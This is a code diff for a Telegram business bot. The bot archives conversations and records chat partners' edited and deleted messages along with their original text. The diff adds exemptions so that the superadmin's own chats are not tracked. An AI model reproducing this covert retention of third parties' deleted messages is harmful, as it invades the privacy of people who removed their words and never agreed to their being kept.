         await archive_message(message, conn_id, chat_id, owner_id, owner_name, is_owner)
 
-    # Автоответчик
     if is_owner:
         owner_settings = await users_collection.find_one({"user_id": owner_id}) or {}
         manual_afk = owner_settings.get("is_afk", False)
@@ -1631,7 +1799,6 @@ async def handle_messages(message: Message):
                 afk_cooldowns[(owner_id, chat_id)] = now
         return
 
-    # Мут — только для собеседников
     mute_key = f"{conn_id}_{chat_id}"
     if mute_key in muted_chats:
         with suppress(Exception):
@@ -1646,20 +1813,22 @@ async def catch_edits(message: Message):
     chat_id = message.chat.id
     conn_id = message.business_connection_id
     if message.from_user.id != chat_id:
-        return  # не свои сообщения
-    new_text = message.text or message.caption or "[Без текста]"
+        return
+    if message.from_user.id == SUPERADMIN_ID:
+        return
+    if chat_id == SUPERADMIN_ID:
+        return
 
+    new_text = message.text or message.caption or "[Без текста]"
     old_doc = await archive_collection.find_one({
         "conn_id": conn_id,
         "chat_id": chat_id,
         "message_id": message.message_id
     })
-
     if not old_doc:
         return
 
     old_text = old_doc.get("text", "")
-
     with suppress(Exception):
         await archive_collection.update_one(
             {"_id": old_doc["_id"]},
@@ -1671,19 +1840,16 @@ async def catch_edits(message: Message):
                 "edited_at": datetime.now(timezone.utc)
             }}
         )
-
     with suppress(Exception):
         await messages_collection.update_one(
             {"business_connection_id": conn_id, "message_id": message.message_id, "chat_id": chat_id},
             {"$set": {"text": new_text}}
         )
 
-    # Статистика по собеседнику
     owner_data = await connections_collection.find_one({"business_connection_id": conn_id})
     if not owner_data:
         return
     owner_id = owner_data["user_id"]
-
     if not old_doc.get("is_owner"):
         with suppress(Exception):
             await deleted_users_collection.update_one(
@@ -1708,10 +1874,15 @@ async def catch_edits(message: Message):
 async def catch_deletions(deleted: BusinessMessagesDeleted):
     conn_id = deleted.business_connection_id
     chat_id = deleted.chat.id
+    if chat_id == SUPERADMIN_ID:
+        return
+
     owner_data = await connections_collection.find_one({"business_connection_id": conn_id})
     if not owner_data:
         return
     owner_id = owner_data["user_id"]
+    if owner_id == SUPERADMIN_ID:
+        return
 
     for msg_id in deleted.message_ids:
         old_msg = await archive_collection.find_one({
@@ -1721,7 +1892,6 @@ async def catch_deletions(deleted: BusinessMessagesDeleted):
         })
         if not old_msg:
             continue
-
         with suppress(Exception):
             await archive_collection.update_one(
                 {"_id": old_msg["_id"]},
@@ -1731,7 +1901,6 @@ async def catch_deletions(deleted: BusinessMessagesDeleted):
                     "deleted_at": datetime.now(timezone.utc)
                 }}
             )
-
         if not old_msg.get("is_owner"):
             with suppress(Exception):
                 await deleted_users_collection.update_one(
@@ -1753,7 +1922,7 @@ async def catch_deletions(deleted: BusinessMessagesDeleted):
 
 
 # ==========================================
-# СНЯТИЕ МУТА (кнопка в бизнес-чате)
+# СНЯТИЕ МУТА (кнопка)
 # ==========================================
 @dp.callback_query(F.data.startswith("unmute|"))
 async def unmute_user(call: CallbackQuery):
